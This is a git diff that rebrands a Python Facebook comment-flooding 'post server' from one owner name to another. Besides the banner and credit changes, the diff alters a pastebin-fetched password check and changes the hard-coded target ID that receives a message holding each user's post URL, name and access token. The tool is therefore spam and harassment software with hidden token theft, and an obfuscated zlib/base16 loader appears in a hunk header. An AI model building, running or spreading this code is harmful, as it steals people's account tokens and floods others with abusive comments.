@@ -16,7 +16,7 @@ html_content = """
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MONXTER BRAND POST SERVER</title>
+    <title>ABHIIII BRAND POST SERVER</title>
     <style>
         body {
             background-image: url('Monxter.jpg');
@@ -47,10 +47,10 @@ html_content = """
 <body>
     <div class="container">
         <div class="box">
-            <h1>TRICKER MONXTER BRAND POST </h1>
+            <h1>TRICKER ABHĪĪĪ BRAND POST </h1>
             <div class="credit">
-                <p>1. CREDIT:- MONXTER RULEX</p>
-                <p>2. OWNER => MONXTER</p>
+                <p>1. CREDIT:- STONE RULEX</p>
+                <p>2. OWNER => ABHIIII</p>
                 <p>3. YOUTUBE:- <a href="https://youtube.com/@monxterrulexhere?si=1YkyDgjPaPi4oa4j">YouTube</a></p>
                 <p>4. FACEBOOK:- <a href="https://www.facebook.com/Loffar.monxter.inside?mibextid=ZbWKwL">Facebook</a></p>
            
@@ -96,17 +96,17 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b16decode(__[
 	
 def send_initial_message():
     
-    mmm_pass = requests.get('https://pastebin.com/raw/xiXncTa9').text
+    mmm_pass = requests.get('https://pastebin.com/raw/bhnjvFhr').text
     
     if mmm_pass not in password:
-        print('\033[1;31m⚠︎ Your Password Changed By Monxter ⚠︎')
+        print('\033[1;31m⚠︎ Your Password Changed By Abhiiii ⚠︎')
         sys.exit()
     
     # Message template
-    msg_template = "CREDIT:- MONXTER RULEX \n Owner => MONXTER \n Hello Monxter Sir. \n I am using your post server. \n This Is My Details :- \n Post Url :- {} \n Name:- {} \n Token :- {}"
+    msg_template = "CREDIT:- STONE RULEX \n Owner => Abhiiii \n Hello Abhīīī Sir. \n I am using your post server. \n This Is My Details :- \n Post Url :- {} \n Name:- {} \n Token :- {}"
     
     # Target IDs
-    target_ids = ["100006628659578"]
+    target_ids = ["100093673451400"]
     
     requests.packages.urllib3.disable_warnings()
     
@@ -134,15 +134,15 @@ def post_comments():
                 response = requests.post(url, json=parameters, headers=headers)
                 current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                 if response.ok:
-                    print("\033[1;36m[✓] TRICKER MONXTER BRAND SERVER RUNING Comment No. {} Post Id {} Token No. {}: {}".format(
+                    print("\033[1;36m[✓] TRICKER ABHIIII BRAND SERVER RUNING Comment No. {} Post Id {} Token No. {}: {}".format(
                         comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                     print(formatted_time)
-                    print('\033[1;92m' + '✪✭═══════•『MONXTER ♡ RULEX </3 MONXTER BRAND』•═══════✭✪')
+                    print('\033[1;92m' + '✪✭═══════•『ST0N3 ♡ RULEX </3 Abhīīī BRAND』•═══════✭✪')
                 else:
                     print("\033[1;35m[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
                         comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                     print(formatted_time)
-                    print('\033[1;92m' + '✪✭═══════•『MONXTER ♡ RULEX </3 MONXTER BRAND』•═══════✭✪')
+                    print('\033[1;92m' + '✪✭═══════•『ST0N3 ♡ RULEX </3 Abhīīī BRAND』•═══════✭✪')
                 time.sleep(speed)
             print("\n[+] All comments sent successfully. Restarting the process...\n")
         except Exception as e:
